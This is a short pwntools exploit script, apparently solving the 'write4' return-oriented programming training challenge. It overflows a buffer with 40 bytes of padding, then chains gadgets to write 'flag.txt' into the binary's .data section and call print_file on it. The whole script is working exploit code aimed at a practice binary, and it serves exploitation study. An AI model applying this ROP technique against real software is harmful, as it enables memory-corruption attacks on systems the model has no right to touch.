from pwn import *

p = process("./write4")
elf = p.elf

# gadgets
# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
# 0x0000000000400690 : pop r14 ; pop r15 ; ret
# 0x0000000000400693 : pop rdi ; ret

pop_14_15 = 0x0000000000400690
mov_14_15 = 0x0000000000400628
pop_rdi = 0x0000000000400693
data_sec_addr = 0x00601028
print_file_addr = elf.symbols["print_file"]

payload = b"".join([
    b"A" * 40,
    p64(pop_14_15),
    p64(data_sec_addr),
    b"flag.txt",
    p64(mov_14_15),
    p64(pop_rdi),
    p64(data_sec_addr),
    p64(print_file_addr),
])

# gdb.attach(p, """
#     b pwnme
# """)
#
p.recvuntil(b"> ")
p.send(payload)
p.interactive()
